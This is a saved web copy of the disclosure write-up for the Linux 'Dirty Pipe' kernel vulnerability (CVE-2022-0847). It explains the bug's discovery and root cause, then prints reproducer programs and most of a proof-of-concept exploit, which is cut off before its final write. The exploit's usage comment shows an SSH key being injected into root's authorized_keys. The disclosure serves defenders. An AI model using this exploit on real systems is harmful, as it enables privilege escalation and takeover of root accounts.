<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://dirtypipe.cm4all.com/">Original</a>
    <h1>The Dirty Pipe Vulnerability</h1>
    
    <div id="readability-page-1" class="page"><div>
      <div>
        <div>
          <div role="main">
            
  <div id="the-dirty-pipe-vulnerability">

<p>Max Kellermann &lt;<a href="mailto:max.kellermann%40ionos.com">max<span>.</span>kellermann<span>@</span>ionos<span>.</span>com</a>&gt;</p>
<div id="abstract">
<h2>Abstract<a href="#abstract" title="Permalink to this headline">¶</a></h2>
<p>This is the story of CVE-2022-0847, a vulnerability in the Linux
kernel since 5.8 which allows overwriting data in arbitrary read-only
files.  This leads to privilege escalation because unprivileged
processes can inject code into root processes.</p>
<p>It is similar to <a href="https://dirtycow.ninja/">CVE-2016-5195 “Dirty Cow”</a> but is easier to exploit.</p>
<p>The vulnerability <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903">was fixed</a>
in Linux 5.16.11, 5.15.25 and 5.10.102.</p>
</div>
<div id="corruption-pt-i">
<h2>Corruption pt. I<a href="#corruption-pt-i" title="Permalink to this headline">¶</a></h2>
<p>It all started a year ago with a support ticket about corrupt files.
A customer complained that the access logs they downloaded could not
be decompressed.  And indeed, there was a corrupt log file on one of
the log servers; it could be decompressed, but <code><span>gzip</span></code> reported a CRC
error.  I could not explain why it was corrupt, but I assumed the
nightly split process had crashed and left a corrupt file behind.  I
fixed the file’s CRC manually, closed the ticket, and soon forgot
about the problem.</p>
<p>Months later, this happened again and yet again.  Every time, the
file’s contents looked correct, only the CRC at the end of the file
was wrong.  Now, with several corrupt files, I was able to dig deeper
and found a surprising kind of corruption.  A pattern emerged.</p>
</div>
<div id="access-logging">
<h2>Access Logging<a href="#access-logging" title="Permalink to this headline">¶</a></h2>
<p>Let me briefly introduce how our log server works: In the CM4all
hosting environment, all web servers (running our <a href="https://github.com/CM4all/beng-proxy/">custom open source
HTTP server</a>) send UDP
multicast datagrams with metadata about each HTTP request.  These are
received by the log servers running <a href="https://github.com/CM4all/pond">Pond</a>, our custom open source in-memory
database.  A nightly job splits all access logs of the previous day
into one per hosted web site, each compressed with <a href="https://zlib.net/">zlib</a>.</p>
<p>Via HTTP, all access logs of a month can be downloaded as a single
<code><span>.gz</span></code> file.  Using a trick (which involves <code><span>Z_SYNC_FLUSH</span></code>), we can
just concatenate all gzipped daily log files without having to
decompress and recompress them, which means this HTTP request consumes
nearly no CPU.  Memory bandwidth is saved by employing the
<code><span>splice()</span></code> system call to feed data directly from the hard disk into
the HTTP connection, without passing the kernel/userspace boundary
(“zero-copy”).</p>
<p>Windows users can’t handle <code><span>.gz</span></code> files, but everybody can extract
ZIP files.  A ZIP file is just a container for <code><span>.gz</span></code> files, so we
could use the same method to generate ZIP files on-the-fly; all we
needed to do was send a ZIP header first, then concatenate all <code><span>.gz</span></code>
file contents as usual, followed by the central directory (another
kind of header).</p>
</div>
<div id="corruption-pt-ii">
<h2>Corruption pt. II<a href="#corruption-pt-ii" title="Permalink to this headline">¶</a></h2>
<p>This is how a the end of a proper daily file looks:</p>
<div><div><pre><span></span><span>000005f0</span>  <span>81</span> <span>d6</span> <span>94</span> <span>39</span> <span>8a</span> <span>05</span> <span>b0</span> <span>ed</span>  <span>e9</span> <span>c0</span> <span>fd</span> <span>07</span> <span>00</span> <span>00</span> <span>ff</span> <span>ff</span>
<span>00000600</span>  <span>03</span> <span>00</span> <span>9c</span> <span>12</span> <span>0b</span> <span>f5</span> <span>f7</span> <span>4a</span>  <span>00 00</span>
</pre></div>
</div>
<p>The <code><span>00</span> <span>00</span> <span>ff</span> <span>ff</span></code> is the <a href="https://www.bolet.org/~pornin/deflate-flush-fr.html">sync flush</a> which allows
simple concatenation.  <code><span>03</span> <span>00</span></code> is <a href="https://datatracker.ietf.org/doc/html/rfc1951#page-9">an empty “final” block</a>, and is
followed by a CRC32 (<code><span>0xf50b129c</span></code>) and the uncompressed file length
(<code><span>0x00004af7</span></code> = 19191 bytes).</p>
<p>The same file but corrupted:</p>
<div><div><pre><span></span><span>000005f0</span>  <span>81</span> <span>d6</span> <span>94</span> <span>39</span> <span>8a</span> <span>05</span> <span>b0</span> <span>ed</span>  <span>e9</span> <span>c0</span> <span>fd</span> <span>07</span> <span>00</span> <span>00</span> <span>ff</span> <span>ff</span>
<span>00000600</span>  <span>03</span> <span>00</span> <span>50</span> <span>4b</span> <span>01</span> <span>02</span> <span>1e</span> <span>03</span>  <span>14 00</span>
</pre></div>
</div>
<p>The sync flush is there, the empty final block is there, but the
uncompressed length is now <code><span>0x0014031e</span></code> = 1.3 MB (that’s wrong, it’s
the same 19 kB file as above).  The CRC32 is <code><span>0x02014b50</span></code>, which
does not match the file contents.  Why?  Is this an out-of-bounds
write or a heap corruption bug in our log client?</p>
<p>I compared all known-corrupt files and discovered, to my surprise,
that all of them had the same CRC32 and the same “file length” value.
Always the same CRC - this implies that this cannot be the result of a
CRC calculation.  With corrupt data, we would see different (but
wrong) CRC values.  For hours, I stared holes into the code but could
not find an explanation.</p>
<p>Then I stared at these 8 bytes.  Eventually, I realized that <code><span>50</span> <span>4b</span></code>
is ASCII for “P” and “K”.  “PK”, that’s how all ZIP headers start.
Let’s have a look at these 8 bytes again:</p>

<ul>
<li><p><code><span>50</span> <span>4b</span></code> is “PK”</p></li>
<li><p><code><span>01</span> <span>02</span></code> is the code for <a href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Central_directory_file_header">central directory file header</a>.</p></li>
<li><p>“Version made by” = <code><span>1e</span> <span>03</span></code>; <code><span>0x1e</span></code> = 30 (3.0); <code><span>0x03</span></code> = UNIX</p></li>
<li><p>“Version needed to extract” = <code><span>14</span> <span>00</span></code>; <code><span>0x0014</span></code> = 20 (2.0)</p></li>
</ul>
<p>The rest is missing; the header was apparently truncated after 8
bytes.</p>
<p>This is really the beginning of a ZIP central directory file header,
this cannot be a coincidence.  But the process which writes these
files has no code to generate such header.  In my desperation, I looked
at the zlib source code and all other libraries used by that process
but found nothing.  This piece of software doesn’t know anything about
“PK” headers.</p>
<p>There is one process which generates “PK” headers, though; it’s the
web service which constructs ZIP files on-the-fly.  But this process
runs as a different user which doesn’t have write permissions on these
files.  It cannot possibly be that process.</p>
<p>None of this made sense, but new support tickets kept coming in (at a
very slow rate).  There was some systematic problem, but I just
couldn’t get a grip on it.  That gave me a lot of frustration, but
I was busy with other tasks, and I kept pushing this file corruption
problem to the back of my queue.</p>
</div>
<div id="corruption-pt-iii">
<h2>Corruption pt. III<a href="#corruption-pt-iii" title="Permalink to this headline">¶</a></h2>
<p>External pressure brought this problem back into my consciousness.  I
scanned the whole hard disk for corrupt files (which took two days),
hoping for more patterns to emerge.  And indeed, there was a pattern:</p>
<ul>
<li><p>there were 37 corrupt files within the past 3 months</p></li>
<li><p>they occurred on 22 unique days</p></li>
<li><p>18 of those days have 1 corruption</p></li>
<li><p>1 day has 2 corruptions (2021-11-21)</p></li>
<li><p>1 day has 7 corruptions (2021-11-30)</p></li>
<li><p>1 day has 6 corruptions (2021-12-31)</p></li>
<li><p>1 day has 4 corruptions (2022-01-31)</p></li>
</ul>
<p>The last day of each month is clearly the one which most corruptions
occur.</p>
<p>Only the primary log server had corruptions (the one which served HTTP
connections and constructed ZIP files).  The standby server (HTTP
inactive but same log extraction process) had zero corruptions.  Data
on both servers was identical, minus those corruptions.</p>
<p>Is this caused by flaky hardware?  Bad RAM?  Bad storage?  Cosmic
rays?  No, the symptoms don’t look like a hardware issue.  A ghost in
the machine?  Do we need an exorcist?</p>
</div>
<div id="man-staring-at-code">
<h2>Man staring at code<a href="#man-staring-at-code" title="Permalink to this headline">¶</a></h2>
<p>I began staring holes into my code again, this time the web service.</p>
<p>Remember, the web service writes a ZIP header, then uses <code><span>splice()</span></code>
to send all compressed files, and finally uses <code><span>write()</span></code> again for
the “central directory file header”, which begins with <code><span>50</span> <span>4b</span> <span>01</span> <span>02</span>
<span>1e</span> <span>03</span> <span>14</span> <span>00</span></code>, exactly the corruption.  The data sent over the wire
looks exactly like the corrupt files on disk.  But the process sending
this on the wire has no write permissions on those files (and doesn’t
even try to do so), it only reads them.  Against all odds and against
the impossible, it <strong>must</strong> be that process which causes corruptions,
but how?</p>
<p>My first flash of inspiration why it’s always the last day of the
month which gets corrupted.  When a website owner downloads the access
log, the server starts with the first day of the month, then the
second day, and so on.  Of course, the last day of the month is
sent at the end; the last day of the month is always followed by the
“PK” header.  That’s why it’s more likely to corrupt the last day.
(The other days can be corrupted if the requested month is not yet
over, but that’s less likely.)</p>
<p>How?</p>
</div>
<div id="man-staring-at-kernel-code">
<h2>Man staring at kernel code<a href="#man-staring-at-kernel-code" title="Permalink to this headline">¶</a></h2>
<p>After being stuck for more hours, after eliminating everything that
was definitely impossible (in my opinion), I drew a conclusion: this
must be a kernel bug.</p>
<p>Blaming the Linux kernel (i.e. somebody else’s code) for data
corruption must be the last resort.  That is unlikely.  The kernel is
an extremely complex project developed by thousands of individuals
with methods that may seem chaotic; despite of this, it is extremely
stable and reliable.  But this time, I was convinced that it must be a
kernel bug.</p>
<p>In a moment of extraordinary clarity, I hacked two C programs.</p>
<p>One that keeps writing odd chunks of the string “AAAAA” to a file
(simulating the log splitter):</p>
<div><div><pre><span></span><span>#include</span> <span>&lt;unistd.h&gt;</span><span></span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span> <span>{</span>
  <span>for</span> <span>(;;)</span> <span>write</span><span>(</span><span>1</span><span>,</span> <span>&#34;AAAAA&#34;</span><span>,</span> <span>5</span><span>);</span>
<span>}</span>
<span>// ./writer &gt;foo</span>
</pre></div>
</div>
<p>And one that keeps transferring data from that file to a pipe using
<code><span>splice()</span></code> and then writes the string “BBBBB” to the pipe
(simulating the ZIP generator):</p>
<div><div><pre><span></span><span>#define _GNU_SOURCE</span>
<span>#include</span> <span>&lt;unistd.h&gt;</span><span></span>
<span>#include</span> <span>&lt;fcntl.h&gt;</span><span></span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span> <span>{</span>
  <span>for</span> <span>(;;)</span> <span>{</span>
    <span>splice</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>2</span><span>,</span> <span>0</span><span>);</span>
    <span>write</span><span>(</span><span>1</span><span>,</span> <span>&#34;BBBBB&#34;</span><span>,</span> <span>5</span><span>);</span>
  <span>}</span>
<span>}</span>
<span>// ./splicer &lt;foo |cat &gt;/dev/null</span>
</pre></div>
</div>
<p>I copied those two programs to the log server, and… <strong>bingo</strong>!  The
string “BBBBB” started appearing in the file, even though nobody ever
wrote this string to the file (only to the pipe by a process without
write permissions).</p>
<p>So this really is a kernel bug!</p>
<p>All bugs become shallow once they can be reproduced.  A quick check
verified that this bug affects Linux 5.10 (Debian Bullseye) but not
Linux 4.19 (Debian Buster).  There are 185.011 git commits between
v4.19 and v5.10, but thanks to <code><span>git</span> <span>bisect</span></code>, it takes just 17 steps
to locate the faulty commit.</p>
<p>The bisect arrived at commit <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">f6dd975583bd</a>,
which refactors the pipe buffer code for anonymous pipe buffers.  It
changes the way how the “mergeable” check is done for pipes.</p>
</div>
<div id="pipes-and-buffers-and-pages">
<h2>Pipes and Buffers and Pages<a href="#pipes-and-buffers-and-pages" title="Permalink to this headline">¶</a></h2>
<p>Why pipes, anyway?  In our setup, the web service which generates ZIP
files communicates with the web server over pipes; it talks the <a href="https://github.com/CM4all/libwas/">Web
Application Socket</a> protocol
which we invented because we were not happy with CGI, FastCGI and AJP.
Using pipes instead of multiplexing over a socket (like FastCGI and
AJP do) has a major advantage: you can use <code><span>splice()</span></code> in both the
application and the web server for maximum efficiency.  This reduces
the overhead for having web applications out-of-process (as opposed
to running web services inside the web server process, like Apache
modules do).  This allows privilege separation without sacrificing
(much) performance.</p>
<p>Short detour on <a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html">Linux memory management</a>:
The smallest unit of memory managed by the CPU is a <strong>page</strong> (usually
4 kB).  Everything in the lowest layer of Linux’s memory management is
about pages.  If an application requests memory from the kernel, it
will get a number of (anonymous) pages.  All file I/O is also about
pages: if you read data from a file, the kernel first copies a number
of 4 kB chunks from the hard disk into kernel memory, managed by a
subsystem called the <strong>page cache</strong>.  From there, the data will be
copied to userspace.  The copy in the page cache remains for some
time, where it can be used again, avoiding unnecessary hard disk I/O,
until the kernel decides it has a better use for that memory
(“reclaim”).  Instead of copying file data to userspace memory, pages
managed by the page cache can be mapped directly into userspace using
the <code><span>mmap()</span></code> system call (a trade-off for reduced memory bandwidth
at the cost of increased page faults and TLB flushes).  The Linux
kernel has more tricks: the <code><span>sendfile()</span></code> system call allows an
application to send file contents into a socket without a roundtrip to
userspace (an optimization popular in web servers serving static files
over HTTP).  The <code><span>splice()</span></code> system call is kind of a generalization
of <code><span>sendfile()</span></code>: It allows the same optimization if either side of
the transfer is a <strong>pipe</strong>; the other side can be almost anything
(another pipe, a file, a socket, a block device, a character device).
The kernel implements this by passing <strong>page</strong> references around, not
actually copying anything (zero-copy).</p>
<p>A <strong>pipe</strong> is a tool for unidirectional inter-process communication.
One end is for pushing data into it, the other end can pull that data.
The Linux kernel <a href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L76">implements this by a ring</a>
of <a href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L26-L32">struct pipe_buffer</a>,
each referring to a <strong>page</strong>.  The first write to a pipe allocates a
page (space for 4 kB worth of data).  If the most recent write does
not fill the page completely, a following write may append to that
existing page instead of allocating a new one.  This is how
“anonymous” pipe buffers work (<a href="https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L217-L221">anon_pipe_buf_ops</a>).</p>
<p>If you, however, <code><span>splice()</span></code> data from a file into the pipe, the
kernel will first load the data into the <strong>page cache</strong>.  Then it will
create a <code><span>struct</span> <span>pipe_buffer</span></code> pointing inside the page cache
(zero-copy), but unlike anonymous pipe buffers, additional data
written to the pipe must not be appended to such a page because the
page is owned by the page cache, not by the pipe.</p>
<p>History of the check for whether new data can be appended to an
existing pipe buffer:</p>
<ul>
<li><p>Long ago, <code><span>struct</span> <span>pipe_buf_operations</span></code> had a flag called
<code><span>can_merge</span></code>.</p></li>
<li><p><a href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Commit 5274f052e7b3 “Introduce sys_splice() system call” (Linux
2.6.16, 2006)</a>
featured the <code><span>splice()</span></code> system call, introducing
<code><span>page_cache_pipe_buf_ops</span></code>, a <code><span>struct</span> <span>pipe_buf_operations</span></code>
implementation for pipe buffers pointing into the page cache, the
first one with <code><span>can_merge=0</span></code> (not mergeable).</p></li>
<li><p><a href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">Commit 01e7187b4119 “pipe: stop using -&gt;can_merge” (Linux
5.0, 2019)</a>
converted the <code><span>can_merge</span></code> flag into a <code><span>struct</span>
<span>pipe_buf_operations</span></code> pointer comparison because only
<code><span>anon_pipe_buf_ops</span></code> has this flag set.</p></li>
<li><p><a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops” (Linux
5.8, 2020)</a>
converted this pointer comparison to per-buffer flag <code><span>PIPE_BUF_FLAG_CAN_MERGE</span></code>.</p></li>
</ul>
<p>Over the years, this check was refactored back and forth, which was
okay.  Or was it?</p>
</div>
<div id="uninitialized">
<h2>Uninitialized<a href="#uninitialized" title="Permalink to this headline">¶</a></h2>
<p>Several years before <code><span>PIPE_BUF_FLAG_CAN_MERGE</span></code> was born, <a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit
241699cd72a8 “new iov_iter flavour: pipe-backed” (Linux 4.9, 2016)</a>
added two new functions which allocate a new <code><span>struct</span> <span>pipe_buffer</span></code>,
but initialization of its <code><span>flags</span></code> member was missing.  It was now
possible to create page cache references with arbitrary flags, but
that did not matter.  It was technically a bug, though without
consequences at that time because all of the existing flags were
rather boring.</p>
<p>This bug suddenly became critical in Linux 5.8 with <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">commit
f6dd975583bd “pipe: merge anon_pipe_buf*_ops”</a>.
By injecting <code><span>PIPE_BUF_FLAG_CAN_MERGE</span></code> into a page cache reference,
it became possible to overwrite data in the page cache, simply by
writing new data into the pipe prepared in a special way.</p>
</div>
<div id="corruption-pt-iv">
<h2>Corruption pt. IV<a href="#corruption-pt-iv" title="Permalink to this headline">¶</a></h2>
<p>This explains the file corruption: First, some data gets written into
the pipe, then lots of files get spliced, creating page cache
references.  Randomly, those may or may not have
<code><span>PIPE_BUF_FLAG_CAN_MERGE</span></code> set.  If yes, then the <code><span>write()</span></code> call
that writes the central directory file header will be written to the
page cache of the last compressed file.</p>
<p>But why only the first 8 bytes of that header?  Actually, all of the
header gets copied to the page cache, but this operation does not
increase the file size.  The original file had only 8 bytes of
“unspliced” space at the end, and only those bytes can be overwritten.
The rest of the page is unused from the page cache’s perspective
(though the pipe buffer code does use it because it has its own page
fill management).</p>
<p>And why does this not happen more often?  Because the page cache does
not write back to disk unless it believes the page is “dirty”.
Accidently overwriting data in the page cache will not make the page
“dirty”.  If no other process happens to “dirty” the file, this change
will be ephemeral; after the next reboot (or after the kernel decides
to drop the page from the cache, e.g. reclaim under memory pressure),
the change is reverted.  This allows interesting attacks without
leaving a trace on hard disk.</p>
</div>
<div id="exploiting">
<h2>Exploiting<a href="#exploiting" title="Permalink to this headline">¶</a></h2>
<p>In my first exploit (the “writer” / “splicer” programs which I used
for the bisect), I had assumed that this bug is only exploitable while
a privileged process writes the file, and that it depends on timing.</p>
<p>When I realized what the real problem was, I was able to widen the
hole by a large margin: it is possible to overwrite the page cache
even in the absence of writers, with no timing constraints, at
(almost) arbitrary positions with arbitrary data.  The limitations
are:</p>
<ul>
<li><p>the attacker must have read permissions (because it needs to
<code><span>splice()</span></code> a page into a pipe)</p></li>
<li><p>the offset must not be on a page boundary (because at least one byte
of that page must have been spliced into the pipe)</p></li>
<li><p>the write cannot cross a page boundary (because a new anonymous
buffer would be created for the rest)</p></li>
<li><p>the file cannot be resized (because the pipe has its own page fill
management and does not tell the page cache how much data has been
appended)</p></li>
</ul>
<p>To exploit this vulnerability, you need to:</p>
<ol>
<li><p>Create a pipe.</p></li>
<li><p>Fill the pipe with arbitrary data (to set the
<code><span>PIPE_BUF_FLAG_CAN_MERGE</span></code> flag in all ring entries).</p></li>
<li><p>Drain the pipe (leaving the flag set in all <code><span>struct</span> <span>pipe_buffer</span></code>
instances on the <code><span>struct</span> <span>pipe_inode_info</span></code> ring).</p></li>
<li><p>Splice data from the target file (opened with <code><span>O_RDONLY</span></code>) into
the pipe from just before the target offset.</p></li>
<li><p>Write arbitrary data into the pipe; this data will overwrite the
cached file page instead of creating a new anomyous <code><span>struct</span>
<span>pipe_buffer</span></code> because <code><span>PIPE_BUF_FLAG_CAN_MERGE</span></code> is set.</p></li>
</ol>
<p>To make this vulnerability more interesting, it not only works without
write permissions, it also works with immutable files, on read-only
btrfs snapshots and on read-only mounts (including CD-ROM mounts).
That is because the page cache is always writable (by the kernel), and
writing to a pipe never checks any permissions.</p>
<p>This is my proof-of-concept exploit:</p>
<div><div><pre><span></span><span>/* SPDX-License-Identifier: GPL-2.0 */</span>
<span>/*</span>
<span> * Copyright 2022 CM4all GmbH / IONOS SE</span>
<span> *</span>
<span> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span>
<span> *</span>
<span> * Proof-of-concept exploit for the Dirty Pipe</span>
<span> * vulnerability (CVE-2022-0847) caused by an uninitialized</span>
<span> * &#34;pipe_buffer.flags&#34; variable.  It demonstrates how to overwrite any</span>
<span> * file contents in the page cache, even if the file is not permitted</span>
<span> * to be written, immutable or on a read-only mount.</span>
<span> *</span>
<span> * This exploit requires Linux 5.8 or later; the code path was made</span>
<span> * reachable by commit f6dd975583bd (&#34;pipe: merge</span>
<span> * anon_pipe_buf*_ops&#34;).  The commit did not introduce the bug, it was</span>
<span> * there before, it just provided an easy way to exploit it.</span>
<span> *</span>
<span> * There are two major limitations of this exploit: the offset cannot</span>
<span> * be on a page boundary (it needs to write one byte before the offset</span>
<span> * to add a reference to this page to the pipe), and the write cannot</span>
<span> * cross a page boundary.</span>
<span> *</span>
<span> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#39;\nssh-ed25519 AAA......\n&#39;</span>
<span> *</span>
<span> * Further explanation: https://dirtypipe.cm4all.com/</span>
<span> */</span>

<span>#define _GNU_SOURCE</span>
<span>#include</span> <span>&lt;unistd.h&gt;</span><span></span>
<span>#include</span> <span>&lt;fcntl.h&gt;</span><span></span>
<span>#include</span> <span>&lt;stdio.h&gt;</span><span></span>
<span>#include</span> <span>&lt;stdlib.h&gt;</span><span></span>
<span>#include</span> <span>&lt;string.h&gt;</span><span></span>
<span>#include</span> <span>&lt;sys/stat.h&gt;</span><span></span>
<span>#include</span> <span>&lt;sys/user.h&gt;</span><span></span>

<span>#ifndef PAGE_SIZE</span>
<span>#define PAGE_SIZE 4096</span>
<span>#endif</span>

<span>/**</span>
<span> * Create a pipe where all &#34;bufs&#34; on the pipe_inode_info ring have the</span>
<span> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span>
<span> */</span>
<span>static</span> <span>void</span> <span>prepare_pipe</span><span>(</span><span>int</span> <span>p</span><span>[</span><span>2</span><span>])</span>
<span>{</span>
	<span>if</span> <span>(</span><span>pipe</span><span>(</span><span>p</span><span>))</span> <span>abort</span><span>();</span>

	<span>const</span> <span>unsigned</span> <span>pipe_size</span> <span>=</span> <span>fcntl</span><span>(</span><span>p</span><span>[</span><span>1</span><span>],</span> <span>F_GETPIPE_SZ</span><span>);</span>
	<span>static</span> <span>char</span> <span>buffer</span><span>[</span><span>4096</span><span>];</span>

	<span>/* fill the pipe completely; each pipe_buffer will now have</span>
<span>	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span>
	<span>for</span> <span>(</span><span>unsigned</span> <span>r</span> <span>=</span> <span>pipe_size</span><span>;</span> <span>r</span> <span>&gt;</span> <span>0</span><span>;)</span> <span>{</span>
		<span>unsigned</span> <span>n</span> <span>=</span> <span>r</span> <span>&gt;</span> <span>sizeof</span><span>(</span><span>buffer</span><span>)</span> <span>?</span> <span>sizeof</span><span>(</span><span>buffer</span><span>)</span> <span>:</span> <span>r</span><span>;</span>
		<span>write</span><span>(</span><span>p</span><span>[</span><span>1</span><span>],</span> <span>buffer</span><span>,</span> <span>n</span><span>);</span>
		<span>r</span> <span>-=</span> <span>n</span><span>;</span>
	<span>}</span>

	<span>/* drain the pipe, freeing all pipe_buffer instances (but</span>
<span>	   leaving the flags initialized) */</span>
	<span>for</span> <span>(</span><span>unsigned</span> <span>r</span> <span>=</span> <span>pipe_size</span><span>;</span> <span>r</span> <span>&gt;</span> <span>0</span><span>;)</span> <span>{</span>
		<span>unsigned</span> <span>n</span> <span>=</span> <span>r</span> <span>&gt;</span> <span>sizeof</span><span>(</span><span>buffer</span><span>)</span> <span>?</span> <span>sizeof</span><span>(</span><span>buffer</span><span>)</span> <span>:</span> <span>r</span><span>;</span>
		<span>read</span><span>(</span><span>p</span><span>[</span><span>0</span><span>],</span> <span>buffer</span><span>,</span> <span>n</span><span>);</span>
		<span>r</span> <span>-=</span> <span>n</span><span>;</span>
	<span>}</span>

	<span>/* the pipe is now empty, and if somebody adds a new</span>
<span>	   pipe_buffer without initializing its &#34;flags&#34;, the buffer</span>
<span>	   will be mergeable */</span>
<span>}</span>

<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span>
<span>{</span>
	<span>if</span> <span>(</span><span>argc</span> <span>!=</span> <span>4</span><span>)</span> <span>{</span>
		<span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;Usage: %s TARGETFILE OFFSET DATA</span><span>\n</span><span>&#34;</span><span>,</span> <span>argv</span><span>[</span><span>0</span><span>]);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>

	<span>/* dumb command-line argument parser */</span>
	<span>const</span> <span>char</span> <span>*</span><span>const</span> <span>path</span> <span>=</span> <span>argv</span><span>[</span><span>1</span><span>];</span>
	<span>loff_t</span> <span>offset</span> <span>=</span> <span>strtoul</span><span>(</span><span>argv</span><span>[</span><span>2</span><span>],</span> <span>NULL</span><span>,</span> <span>0</span><span>);</span>
	<span>const</span> <span>char</span> <span>*</span><span>const</span> <span>data</span> <span>=</span> <span>argv</span><span>[</span><span>3</span><span>];</span>
	<span>const</span> <span>size_t</span> <span>data_size</span> <span>=</span> <span>strlen</span><span>(</span><span>data</span><span>);</span>

	<span>if</span> <span>(</span><span>offset</span> <span>%</span> <span>PAGE_SIZE</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
		<span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;Sorry, cannot start writing at a page boundary</span><span>\n</span><span>&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>

	<span>const</span> <span>loff_t</span> <span>next_page</span> <span>=</span> <span>(</span><span>offset</span> <span>|</span> <span>(</span><span>PAGE_SIZE</span> <span>-</span> <span>1</span><span>))</span> <span>+</span> <span>1</span><span>;</span>
	<span>const</span> <span>loff_t</span> <span>end_offset</span> <span>=</span> <span>offset</span> <span>+</span> <span>(</span><span>loff_t</span><span>)</span><span>data_size</span><span>;</span>
	<span>if</span> <span>(</span><span>end_offset</span> <span>&gt;</span> <span>next_page</span><span>)</span> <span>{</span>
		<span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;Sorry, cannot write across a page boundary</span><span>\n</span><span>&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>

	<span>/* open the input file and validate the specified offset */</span>
	<span>const</span> <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>path</span><span>,</span> <span>O_RDONLY</span><span>);</span> <span>// yes, read-only! :-)</span>
	<span>if</span> <span>(</span><span>fd</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
		<span>perror</span><span>(</span><span>&#34;open failed&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>

	<span>struct</span> <span>stat</span> <span>st</span><span>;</span>
	<span>if</span> <span>(</span><span>fstat</span><span>(</span><span>fd</span><span>,</span> <span>&amp;</span><span>st</span><span>))</span> <span>{</span>
		<span>perror</span><span>(</span><span>&#34;stat failed&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>

	<span>if</span> <span>(</span><span>offset</span> <span>&gt;</span> <span>st</span><span>.</span><span>st_size</span><span>)</span> <span>{</span>
		<span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;Offset is not inside the file</span><span>\n</span><span>&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>

	<span>if</span> <span>(</span><span>end_offset</span> <span>&gt;</span> <span>st</span><span>.</span><span>st_size</span><span>)</span> <span>{</span>
		<span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;Sorry, cannot enlarge the file</span><span>\n</span><span>&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>

	<span>/* create the pipe with all flags initialized with</span>
<span>	   PIPE_BUF_FLAG_CAN_MERGE */</span>
	<span>int</span> <span>p</span><span>[</span><span>2</span><span>];</span>
	<span>prepare_pipe</span><span>(</span><span>p</span><span>);</span>

	<span>/* splice one byte from before the specified offset into the</span>
<span>	   pipe; this will add a reference to the page cache, but</span>
<span>	   since copy_page_to_iter_pipe() does not initialize the</span>
<span>	   &#34;flags&#34;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span>
	<span>--</span><span>offset</span><span>;</span>
	<span>ssize_t</span> <span>nbytes</span> <span>=</span> <span>splice</span><span>(</span><span>fd</span><span>,</span> <span>&amp;</span><span>offset</span><span>,</span> <span>p</span><span>[</span><span>1</span><span>],</span> <span>NULL</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>);</span>
	<span>if</span> <span>(</span><span>nbytes</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
		<span>perror</span><span>(</span><span>&#34;splice failed&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>
	<span>if</span> <span>(</span><span>nbytes</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
		<span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;short splice</span><span>\n</span><span>&#34;</span><span>);</span>
		<span>return</span> <span>EXIT_FAILURE</span><span>;</span>
	<span>}</span>

	<span>/* the following write will not create a new pipe_buffer, but</span>
<span>	   will instead write into the page cache, because of the</span>
<span>	   PIPE_BUF_FLAG_CAN_MERGE flag */</span>
